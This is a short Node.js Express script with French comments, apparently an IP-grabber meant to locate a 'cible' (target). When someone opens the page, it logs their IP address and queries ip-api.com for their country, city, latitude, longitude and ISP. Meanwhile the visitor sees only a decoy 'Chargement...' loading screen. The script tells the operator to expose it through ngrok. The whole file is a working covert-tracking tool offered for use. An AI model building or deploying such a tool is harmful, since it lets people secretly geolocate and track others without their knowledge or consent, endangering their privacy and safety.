const express = require('express');
const axios = require('axios');
const chalk = require('chalk');
const { exec } = require('child_process');
const app = express();
const port = 3000;

// Middleware pour parser le JSON
app.use(express.json());

// Route pour l'interface de la cible
app.get('/', (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    console.log(chalk.green(`[+] Nouvelle connexion depuis l'IP : ${ip}`));

    // Récupérer la géolocalisation
    axios.get(`http://ip-api.com/json/${ip}`)
        .then(response => {
            const data = response.data;
            console.log(chalk.blue(`[+] Localisation de la cible :`));
            console.log(chalk.blue(`- Pays : ${data.country}`));
            console.log(chalk.blue(`- Région : ${data.regionName}`));
            console.log(chalk.blue(`- Ville : ${data.city}`));
            console.log(chalk.blue(`- Latitude : ${data.lat}`));
            console.log(chalk.blue(`- Longitude : ${data.lon}`));
            console.log(chalk.blue(`- ISP : ${data.isp}`));
        })
        .catch(error => {
            console.log(chalk.red(`[!] Erreur de géolocalisation : ${error.message}`));
        });

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Localisation en cours...</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; background: #111; color: #fff; }
                h1 { color: #ff0000; }
            </style>
        </head>
        <body>
            <h1>Chargement...</h1>
            <p>Merci de patienter.</p>
        </body>
        </html>
    `);
});

// Démarrer le serveur
app.listen(port, () => {
    console.log(chalk.yellow(`[*] Serveur démarré sur http://localhost:${port}`));
    console.log(chalk.yellow(`[*] Lance ngrok manuellement avec : ngrok http ${port}`));
});
